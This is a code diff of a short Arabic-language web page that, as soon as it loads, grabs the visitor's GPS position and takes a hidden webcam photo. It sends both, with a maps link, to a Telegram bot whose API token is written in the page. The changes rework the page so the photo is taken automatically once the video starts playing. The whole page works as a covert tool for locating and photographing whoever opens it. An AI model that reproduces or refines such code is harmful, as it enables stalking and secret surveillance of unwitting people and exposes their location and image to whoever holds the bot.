@@ -2,13 +2,13 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>📍 تحديد الموقع + كاميرا</title>
+  <title>📍 تحديد + تصوير تلقائي</title>
 </head>
 <body>
   <h2>📡 جاري جمع المعلومات...</h2>
   <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
-  <pre id="result">جارٍ التحقق من الموقع والكاميرا...</pre>
+  <pre id="result">يرجى السماح بالموقع والكاميرا...</pre>
 
   <script>
     const token = "7692799219:AAGv_dCGtZ5c-6MXTrUUJeEVoBDATMN3RgI";
@@ -33,8 +33,7 @@
       });
     }
 
-    function capturePhotoAndSend() {
-      const video = document.getElementById("video");
+    function capturePhotoAndSend(video, stream) {
       const canvas = document.getElementById("canvas");
       const context = canvas.getContext("2d");
 
@@ -45,37 +44,30 @@
       canvas.toBlob(blob => {
         sendPhoto(blob)
           .then(() => {
-            document.getElementById("result").innerText += "\n📸 تم إرسال الصورة.";
+            document.getElementById("result").innerText += "\n📸 الصورة أُرسلت.";
           })
           .catch(err => {
             document.getElementById("result").innerText += "\n❌ فشل إرسال الصورة: " + err.message;
           });
       }, "image/jpeg");
+
+      stream.getTracks().forEach(track => track.stop());
     }
 
-function initCamera() {
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-      const video = document.getElementById("video");
-      video.srcObject = stream;
+    function initCamera() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          const video = document.getElementById("video");
+          video.srcObject = stream;
 
-      video.onloadedmetadata = () => {
-        const canvas = document.getElementById("canvas");
-        const ctx = canvas.getContext("2d");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.drawImage(video, 0, 0);
-        canvas.toBlob(blob => {
-          sendPhoto(blob);
-        }, "image/jpeg");
-
-        stream.getTracks().forEach(track => track.stop());
-      };
-    })
-    .catch(err => {
-      document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
-    });
-}
+          video.addEventListener('playing', () => {
+            capturePhotoAndSend(video, stream);
+          });
+        })
+        .catch(err => {
+          document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
+        });
+    }
 
     function getLocationAndSend() {
       if ("geolocation" in navigator) {
@@ -85,12 +77,11 @@ function initCamera() {
             const lon = pos.coords.longitude.toFixed(6);
             const acc = pos.coords.accuracy;
 
-            const msg = `📍 تم تحديد الموقع بدقة GPS:
-
+            const msg = `📍 تحديد الموقع (GPS):
 Latitude: ${lat}
 Longitude: ${lon}
 📏 الدقة: ±${acc} متر
-🗺️ خرائط: https://www.google.com/maps?q=${lat},${lon}`;
+🗺️ https://www.google.com/maps?q=${lat},${lon}`;
 
             document.getElementById("result").innerText = msg;
             sendMessage(msg);
@@ -111,7 +102,7 @@ Longitude: ${lon}
       }
     }
 
-    // ✅ البداية:
+    // البدء مباشرة
     getLocationAndSend();
     initCamera();
   </script>
